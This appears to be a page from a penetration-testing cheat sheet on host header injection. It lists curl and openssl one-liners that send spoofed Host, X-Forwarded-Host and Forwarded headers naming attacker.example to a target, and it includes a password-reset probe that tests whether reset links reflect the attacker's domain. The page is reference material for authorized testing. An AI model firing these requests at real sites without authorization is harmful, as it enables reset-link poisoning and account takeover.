---
hide:
  - toc
---
# Host Header Injection

Fast probes for host-derived links, routing and cache behaviour.

<div class="ol-section-kicker"><span>WEB</span><strong>HOST</strong></div>

## Alternate Host header
```bash
curl -sk -H 'Host: attacker.example' https://<TARGET>/ -D - -o /dev/null
```
**Tool:** curl · **Platform:** Any · **Tags:** Host Header, Routing · **Context:** No auth · **Noise:** Moderate

## X-Forwarded-Host probe
```bash
curl -sk -H 'X-Forwarded-Host: attacker.example' https://<TARGET>/ -D - -o /dev/null
```
**Tool:** curl · **Platform:** Any · **Tags:** Proxy Headers, Host Header · **Context:** No auth · **Noise:** Moderate

## Forwarded header probe
```bash
curl -sk -H 'Forwarded: host=attacker.example;proto=https' https://<TARGET>/ -D - -o /dev/null
```
**Tool:** curl · **Platform:** Any · **Tags:** Forwarded, Host Header · **Context:** No auth · **Noise:** Moderate

## Absolute-form request
```bash
printf 'GET https://attacker.example/ HTTP/1.1\r\nHost: <TARGET>\r\nConnection: close\r\n\r\n' | openssl s_client -quiet -connect <TARGET>:443 2>/dev/null
```
**Tool:** openssl · **Platform:** Linux/macOS · **Tags:** Absolute URI, Host Header · **Context:** No auth · **Noise:** Moderate

## Password-reset link reflection
```bash
curl -sk -X POST https://<TARGET>/forgot-password -H 'Host: attacker.example' -d 'email=<TEST_EMAIL>' -D -
```
**Tool:** curl · **Platform:** Any · **Tags:** Password Reset, Host Header · **Context:** No auth · **Noise:** Moderate

**Related:** [VHost Discovery](vhosts.md) · [Cache Poisoning & Deception](cache.md) · [HTTP Methods](http-methods.md)
